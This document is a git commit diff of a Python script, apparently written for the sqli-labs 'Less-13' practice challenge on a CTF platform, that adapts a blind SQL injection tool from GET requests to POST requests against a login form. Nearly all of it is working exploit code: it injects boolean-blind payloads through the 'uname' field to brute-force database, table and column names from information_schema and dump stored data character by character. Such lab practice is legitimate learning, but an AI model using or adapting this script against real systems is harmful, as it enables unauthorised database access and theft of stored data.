439e3961b81fe0be9e0f5e56570f65643230ea21
Hausa_ <572157852@qq.com>
2022-08-06 22:48:45 +0800

    sec/sqli/less13

--- security/sqliLab/less13.py
+++ security/sqliLab/less13.py
@@ -3,16 +3,22 @@ from time import sleep
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://c56d00ef-d983-4071-b3b1-31b9e91b5207.node4.buuoj.cn:81/Less-8/?id=1'
-# less5:'  less6:"  less7:'))  less8:'
-poc = '\''
+baseurl = 'http://2c517be5-54c6-4edb-87d8-01f0acb5e11b.node4.buuoj.cn/Less-13/'
+# less13:')
+poc = '\')'
+postData = {
+    'uname': 'admin'+poc,
+    'passwd': '1',
+    'submit': 'Submit'
+}
 delayBetweenRequests = 1
 
 
-def get(url, header=standardHeader):
-    res = req.get(url, headers=header)
+def post(url, header=standardHeader, data=postData):
+    res = req.post(url, headers=header, data=data)
     sleep(delayBetweenRequests)
     return res
+
 
 def checkRes(res, okText):
     if okText in res:
@@ -21,31 +27,23 @@ def checkRes(res, okText):
         return False
 
 
-def confirmPosition(pocUrl, okText):
-    print("Checking the columns of API result")
-    checkUrl = pocUrl + " order by "
-    for i in range(1, 100):
-        res = get(checkUrl + str(i) + " -- -")
-        if not checkRes(res.text, okText):
-            return i-1
-
-
 def forceDatabases(pocUrl, okText):
     payload = "(select group_concat(schema_name) from information_schema.schemata)"
-    s = " union select 1,2,{} limit 1,1 -- -"
     print("Forcing database length")
     for databaseConcatLength in range(50,9999):
-        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))
-        res = get(expUrl)
+        expData = {'passwd': '1', 'submit': 'Submit',
+                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))}
+        res = post(baseurl, data=expData)
         if not checkRes(res.text, okText):
             print("Database length is {}\nForcing each char".format(databaseConcatLength))
             allDatabases = ''
-            payload = "and left(" + payload + ",{})='{}' -- -"
+            payload = " and left(" + payload + ",{})='{}' -- -"
             for index in range(1,databaseConcatLength+1):
                 for char in sqlForce:
                     nowDatabases = allDatabases + char
-                    expUrl = pocUrl + payload.format(str(index), nowDatabases)
-                    res = get(expUrl)
+                    expData = {'passwd': '1', 'submit': 'Submit',
+                               'uname': postData['uname'] + payload.format(str(index), nowDatabases)}
+                    res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
                         allDatabases = nowDatabases
                         print(allDatabases)
@@ -55,11 +53,11 @@ def forceDatabases(pocUrl, okText):
 
 def forceTables(pocUrl, database, okText):
     payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
-    s = " union select 1,2,{} limit 1,1 -- -"
     print("Forcing all tables' length")
     for tableConcatLength in range(1, 9999):
-        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(tableConcatLength))
-        res = get(expUrl)
+        expData = {'passwd': '1', 'submit': 'Submit',
+                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(tableConcatLength))}
+        res = post(baseurl, data=expData)
         if not checkRes(res.text, okText):
             print("table length is {}\nForcing each char".format(tableConcatLength))
             allTables = ''
@@ -67,8 +65,9 @@ def forceTables(pocUrl, database, okText):
             for index in range(1, tableConcatLength+1):
                 for char in sqlForce:
                     nowTables = allTables + char
-                    expUrl = pocUrl + payload.format(str(index), nowTables)
-                    res = get(expUrl)
+                    expData = {'passwd': '1', 'submit': 'Submit',
+                               'uname': postData['uname'] + payload.format(str(index), nowTables)}
+                    res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
                         allTables = nowTables
                         print(allTables)
@@ -80,8 +79,9 @@ def forceColumns(pocUrl, table, okText):
     payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
     print("Forcing all columns' length")
     for columnConcatLength in range(1, 9999):
-        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(columnConcatLength))
-        res = get(expUrl)
+        expData = {'passwd': '1', 'submit': 'Submit',
+                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(columnConcatLength))}
+        res = post(baseurl, data=expData)
         if not checkRes(res.text, okText):
             print("columns length is {}\nForcing each char".format(columnConcatLength))
             allColumns = ''
@@ -89,8 +89,9 @@ def forceColumns(pocUrl, table, okText):
             for index in range(1, columnConcatLength+1):
                 for char in sqlForce:
                     nowColumns = allColumns + char
-                    expUrl = pocUrl + payload.format(str(index), nowColumns)
-                    res = get(expUrl)
+                    expData = {'passwd': '1', 'submit': 'Submit',
+                               'uname': postData['uname'] + payload.format(str(index), nowColumns)}
+                    res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
                         allColumns = nowColumns
                         print(allColumns)
@@ -102,8 +103,9 @@ def dumpData(pocUrl, okText, database, table, column='*'):
     payload = "(select {} from {}.{})".format(column, database, table)
     print("Forcing all data's length")
     for dataConcatLength in range(1, 9999):
-        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))
-        res = get(expUrl)
+        expData = {'passwd': '1', 'submit': 'Submit',
+                   'uname': postData['uname'] + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))}
+        res = post(baseurl, data=expData)
         if not checkRes(res.text, okText):
             print("data length is {}\nForcing each char".format(dataConcatLength))
             allData = ''
@@ -111,9 +113,9 @@ def dumpData(pocUrl, okText, database, table, column='*'):
             for index in range(1, dataConcatLength+1):
                 for char in sqlForce:
                     nowData = allData + char
-                    expUrl = pocUrl + payload.format(str(index), nowData)
-                    # print(expUrl)
-                    res = get(expUrl)
+                    expData = {'passwd': '1', 'submit': 'Submit',
+                               'uname': postData['uname'] + payload.format(str(index), nowData)}
+                    res = post(baseurl, data=expData)
                     if checkRes(res.text, okText):
                         allData = nowData
                         print(allData)
@@ -122,21 +124,16 @@ def dumpData(pocUrl, okText, database, table, column='*'):
 
 
 if __name__ == '__main__':
-    okText = 'You are in'
-    res = get(baseurl)
-    positionCount = confirmPosition(baseurl+poc, okText)
-    print('There are {} positions'.format(positionCount))
-    position = ''
-    for i in range(1, positionCount):
-        position = position + str(i) + ','
-    databases = forceDatabases(baseurl+poc, okText)
-    print('Input a database to force all tables:')
-    database = input()
-    tables = forceTables(baseurl+poc, database, okText)
-    print('Input a table to force all columns:')
-    table = input()
-    columns = forceColumns(baseurl+poc, table, okText)
-    print('Input a column to force all data:')
-    dumpColumn = input()
-    data = dumpData(baseurl+poc, okText, database=database, table=table, column=dumpColumn)
-    print(data)
+    okText = 'flag.jpg'
+    res = post(baseurl)
+    # # databases = forceDatabases(baseurl, okText)
+    # print('Input a database to force all tables:')
+    # database = input()
+    # # tables = forceTables(baseurl, database, okText)
+    # print('Input a table to force all columns:')
+    # table = input()
+    # # columns = forceColumns(baseurl, table, okText)
+    # print('Input a column to force all data:')
+    # dumpColumn = input()
+    data1 = dumpData(baseurl, okText, database='ctftraining', table='flag', column='flag')
+    print(data1)
